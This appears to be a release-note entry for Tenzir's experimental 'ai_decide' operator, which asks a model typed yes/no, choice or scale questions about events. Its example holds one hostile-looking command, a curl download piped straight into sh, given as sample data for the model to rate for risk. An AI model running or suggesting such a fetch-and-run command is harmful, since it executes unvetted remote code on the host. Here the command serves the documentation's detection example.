---
title: Typed decisions with ai_decide
type: feature
authors:
  - mavam
created: 2026-10-09T07:56:02.667133Z
---

The new experimental `ai_decide` operator asks a decision model typed questions about each event and attaches structured answers instead of generated text. It works with any endpoint that serves the System One API, such as hosted Jev or a local Laya server.

Ask one question with a positional argument. Without further arguments, the model answers yes or no with a probability. Add `choices` to pick one of several named options, or `scale` to rate the event on an ordered list of levels:

```tql
from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
ai_decide "How risky is this command for the host?",
  scale=["Routine administration", "Unusual but plausible", "Likely malicious"],
  state=cmd,
  model="jev-latest",
  endpoint="https://api.typesafe.ai/v1",
  api_key=secret("typesafe-api-key")
where ai.decide.answer.score >= 1.5
```

To ask several questions in one request, pass a `questions` record and read each answer from `ai.decide.answers.<id>`. Tenzir checks the questions when it compiles the pipeline, so mistakes such as an unknown question type, missing or empty criteria, or a scale given as a record fail before the pipeline runs.

Like `ai_prompt`, the operator preserves input order, runs up to `concurrency` requests at a time, and reports the model, token usage, truncation, and latency. If a request fails, it emits a warning and writes `null` to the result field, so a pipeline can fail open with `where ai.decide == null or ...`.
